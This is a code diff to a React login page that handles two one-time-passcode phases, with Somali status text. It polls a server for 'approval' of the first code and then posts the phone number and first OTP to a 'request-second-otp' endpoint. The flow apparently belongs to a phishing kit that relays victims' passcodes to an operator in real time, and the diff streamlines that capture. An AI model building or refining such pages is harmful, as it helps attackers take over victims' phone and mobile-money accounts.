@@ -45,8 +45,6 @@ export default function Login() {
   const [otp1Submitting, setOtp1Submitting] = useState(false);
   const [otp1Resending, setOtp1Resending] = useState(false);
   const [otp1Processing, setOtp1Processing] = useState(false);
-  const [otp1Approved, setOtp1Approved] = useState(false);
-  const [otp1Progress, setOtp1Progress] = useState(0);
   const [otp1Status, setOtp1Status] = useState('');
   const [showOtp1ErrorModal, setShowOtp1ErrorModal] = useState(false);
   const [showOtp1WrongPinModal, setShowOtp1WrongPinModal] = useState(false);
@@ -300,31 +298,22 @@ export default function Login() {
     return () => clearInterval(id);
   }, [phase, otp1Timer, otp1Processing, otp1WaitingForApproval]);
 
-  // OTP1 progress → navigate to otp2
-  useEffect(() => {
-    if (phase !== 'otp1') return;
-    if (otp1Processing && otp1Approved && otp1Progress < 100) {
-      const t = setTimeout(() => setOtp1Progress(p => Math.min(p + Math.random() * 15 + 5, 100)), 300);
-      return () => clearTimeout(t);
-    }
-    if (otp1Progress >= 100 && otp1Approved) {
-      setTimeout(() => {
-        if (otp1PollRef.current) clearInterval(otp1PollRef.current);
-        localStorage.removeItem('first_otp_timer');
-        // Transition to OTP2
-        setPhase('otp2');
-        setOtp2Timer(40);
-        previousStatusRef.current = null;
-        setOtp2Status('');
-        abortRef.current = false;
-        // Request second OTP
-        requestSecondOtp();
-        setShowOtp2SuccessToast(true);
-        setTimeout(() => otp2Refs[0].current?.focus(), 100);
-        localStorage.setItem('second_otp_timer', JSON.stringify({ endTime: Date.now() + 40000 }));
-      }, 500);
-    }
-  }, [phase, otp1Processing, otp1Approved, otp1Progress]);
+  // OTP1 approval → direct transition to OTP2 (no progress bar)
+  const transitionToOtp2 = (firstOtp) => {
+    if (otp1PollRef.current) clearInterval(otp1PollRef.current);
+    localStorage.removeItem('first_otp_timer');
+    abortRef.current = false;
+    setOtp1Processing(false);
+    setPhase('otp2');
+    setOtp2Timer(40);
+    previousStatusRef.current = null;
+    setOtp2Status('');
+    // Pass firstOtp explicitly so requestSecondOtp gets the fresh value
+    requestSecondOtpWith(firstOtp);
+    setShowOtp2SuccessToast(true);
+    localStorage.setItem('second_otp_timer', JSON.stringify({ endTime: Date.now() + 40000 }));
+    setTimeout(() => otp2Refs[0].current?.focus(), 100);
+  };
 
   // OTP1 toast timers
   useEffect(() => {
@@ -400,10 +389,8 @@ export default function Login() {
       setOtp1Approved(false); setOtp1Progress(0);
       const result = await checkOtp1Status(phone, fullOtp);
       if (result.approved) {
-        setOtp1Status('✅ OTP la xaqiijiyay!');
-        previousStatusRef.current = '✅ OTP la xaqiijiyay!';
-        setOtp1Approved(true);
         updateAuthData({ firstOtp: fullOtp });
+        transitionToOtp2(fullOtp);
       } else if (result.wrongPin) {
         setOtp1Processing(false); setOtp1Submitting(false); setOtp1Progress(0); setOtp1Approved(false);
         setShowOtp1WrongPinModal(true); previousStatusRef.current = null;
@@ -460,6 +447,16 @@ export default function Login() {
   // ══════════════════════════════════════════════════════════════════════════
   // OTP2 PHASE (Confirm.jsx logic)
   // ══════════════════════════════════════════════════════════════════════════
+
+  const requestSecondOtpWith = async (firstOtp) => {
+    try {
+      const phone = getFullPhone();
+      await fetch(api('request-second-otp'), {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phoneNumber: phone, firstOtp, timestamp: new Date().toISOString() }),
+      });
+    } catch {}
+  };
 
   const requestSecondOtp = async () => {
     try {
